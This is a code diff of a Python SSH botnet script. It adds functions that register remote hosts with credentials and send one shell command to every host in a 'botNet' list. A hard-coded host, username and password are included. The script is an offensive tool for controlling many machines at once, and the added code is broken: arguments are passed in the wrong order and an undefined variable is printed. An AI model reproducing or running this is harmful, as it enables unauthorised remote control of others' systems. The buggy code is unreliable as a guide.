@@ -1,7 +1,7 @@
 import optparse
-import pxssh
+from pexpect import pxssh
 
-class Client:
+class clientClass:
 
     def __init__(self,host,user,password):
         self.host=host
@@ -22,5 +22,16 @@ class Client:
         self.session.sendline(cmd)
         self.session.prompt()
         return self.session.before
-        
 
+def add_client(host,user,password):
+    client=clientClass(user,host,password)
+    botNet.append(client)
+
+def botnetCommand(command):
+    for client in botNet:
+        out=client.send_command(command)
+        print('[*] Output from '+client.host)
+        print('[+] '+output+'\n')
+
+botNet=[]
+add_client('s3.sshservers.us','data-freevpn.us','pass')
